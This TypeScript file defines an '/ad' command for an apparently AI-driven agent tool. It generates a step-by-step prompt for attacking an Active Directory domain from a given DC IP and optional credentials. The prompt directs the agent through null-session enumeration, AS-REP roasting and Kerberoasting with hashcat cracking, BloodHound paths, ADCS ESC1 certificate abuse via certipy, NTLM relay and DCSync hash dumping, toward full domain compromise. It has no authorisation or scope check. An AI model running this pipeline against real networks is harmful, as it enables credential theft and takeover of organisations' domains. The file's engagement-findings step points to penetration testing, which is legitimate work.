import type { ContentBlockParam } from '@anthropic-ai/sdk/resources/index.mjs'
import type { Command } from '../../commands.js'
import { homedir } from 'os'
import { join } from 'path'

const ad = {
  type: 'prompt',
  name: 'ad',
  description: 'Active Directory attack pipeline: recon → Kerberoast/AS-REP → ADCS ESC → DCSync → full domain compromise',
  argumentHint: '<dc_ip> <domain> [username] [password]',
  source: 'builtin',
  progressMessage: 'Running AD attack pipeline',
  async getPromptForCommand(args: string): Promise<ContentBlockParam[]> {
    const parts = args.trim().split(/\s+/)
    const dcIp = parts[0] ?? ''
    const domain = parts[1] ?? ''
    if (!dcIp || !domain) {
      return [{ type: 'text', text: 'Usage: /ad <dc_ip> <domain> [username] [password]\nExample: /ad 10.10.10.1 contoso.local\nExample: /ad 10.10.10.1 contoso.local jdoe Password123\n\nWhen credentials are not known yet, run without user/pass for null-session enumeration.' }]
    }
    const username = parts[2] ?? ''
    const password = parts[3] ?? ''
    const hasAuth = !!(username && password)
    const outputDir = join(homedir(), 'Targets', domain)
    return [{ type: 'text', text: buildADPrompt(dcIp, domain, username, password, hasAuth, outputDir) }]
  },
  contentLength: 0,
} satisfies Command

function buildADPrompt(dcIp: string, domain: string, username: string, password: string, hasAuth: boolean, outputDir: string): string {
  const credNote = hasAuth
    ? `**Credentials**: ${username} / ${password}`
    : '**Credentials**: none yet — start with null-session recon, then try to gain creds via Kerberoast/AS-REP'

  return `Active Directory attack on **${domain}** (DC: ${dcIp})
${credNote}
**Output**: \`${outputDir}/\`

## Priority: ADCS ESC1/ESC8 > DCSync > Kerberoast > AS-REP > BloodHound paths

---

## Phase 1 — Initial Enumeration

### 1a. Store AD context (do this first — avoids repeating creds in every tool call)
\`\`\`
EngagementTool action=ad_session target="${domain}" ad_context={sub_action:"set", dc_ip:"${dcIp}", domain:"${domain}"${hasAuth ? `, username:"${username}", password:"${password}"` : ''}}
\`\`\`

### 1b. SMB enumeration (null session or authenticated)
\`\`\`
ADReconTool action=smb_enum dc_ip="${dcIp}" domain="${domain}"${hasAuth ? ` username="${username}" password="${password}"` : ''}
\`\`\`
- Look for: signing=disabled (relay candidate), shares with sensitive data, null session access

### 1c. User enumeration
\`\`\`
ADReconTool action=user_enum dc_ip="${dcIp}" domain="${domain}"${hasAuth ? ` username="${username}" password="${password}"` : ''}
\`\`\`
${!hasAuth ? '- Without creds: kerbrute username enumeration (requires userlist)' : '- With creds: ldapdomaindump full dump'}

---

## Phase 2 — Credential Attacks (run in parallel)

### 2a. AS-REP Roasting (no creds needed)
\`\`\`
ADReconTool action=asreproast_enum dc_ip="${dcIp}" domain="${domain}"${hasAuth ? ` username="${username}" password="${password}"` : ''}
\`\`\`
If hashes found: HashTool operation=crack_hashcat hash=<hash> hash_type=18200 wordlist=rockyou

### 2b. Kerberoasting (requires any valid credentials)
${hasAuth ? `\`\`\`
ADReconTool action=kerberoast_enum dc_ip="${dcIp}" domain="${domain}" username="${username}" password="${password}"
\`\`\`
If hashes found: HashTool operation=crack_hashcat hash=<hash> hash_type=13100 wordlist=rockyou` : '- Requires credentials — run after gaining initial access'}

---

## Phase 3 — BloodHound + ADCS (requires credentials)

### 3a. BloodHound collection
${hasAuth ? `\`\`\`
ADReconTool action=bloodhound_collect dc_ip="${dcIp}" domain="${domain}" username="${username}" password="${password}"
\`\`\`
After collection: ChainTool bug_class=bloodhound-path target_url="${domain}" for shortest path to DA` : '- Requires credentials'}

### 3b. ADCS enumeration (highest priority — ESC1 = instant DA)
${hasAuth ? `\`\`\`
ADReconTool action=adcs_enum dc_ip="${dcIp}" domain="${domain}" username="${username}" password="${password}"
\`\`\`
If ESC1/ESC3 found: ADAttackTool action=adcs_exploit dc_ip="${dcIp}" domain="${domain}" username="${username}" password="${password}" ca_name=<CA> template=<TEMPLATE> upn=administrator@${domain}
Then: certipy auth -pfx adcs-cert.pfx -dc-ip ${dcIp}` : '- Requires credentials'}

---

## Phase 4 — Attack Based on Findings

### Priority order:
1. **ADCS ESC1/ESC8 confirmed** → ADAttackTool action=adcs_exploit → certipy auth → DCSync
2. **Cracked password from Kerberoast/AS-REP** → Check privileges with BloodHound → if privileged → DCSync
3. **SMB signing disabled** → ADAttackTool action=relay_setup → capture creds → escalate
4. **BloodHound ACL path** → ChainTool bug_class=bloodhound-path → ACL abuse → DA
5. **Gained DA** → ADAttackTool action=dcsync → dump all hashes

### DCSync (when DA rights obtained)
\`\`\`
ADAttackTool action=dcsync dc_ip="${dcIp}" domain="${domain}" username=<DA_USER> password=<DA_PASS>
\`\`\`

---

## Phase 5 — Document Findings
For each confirmed finding, record with:
\`\`\`
EngagementTool action=add_finding target="${domain}" finding={title:"<class>",severity:"P1",endpoint:"DC: ${dcIp}",payload:"<command>",evidence:"<output>",impact:"<what_was_achieved>",vuln_class:"<ad_attack_type>"}
\`\`\``
}

export default ad
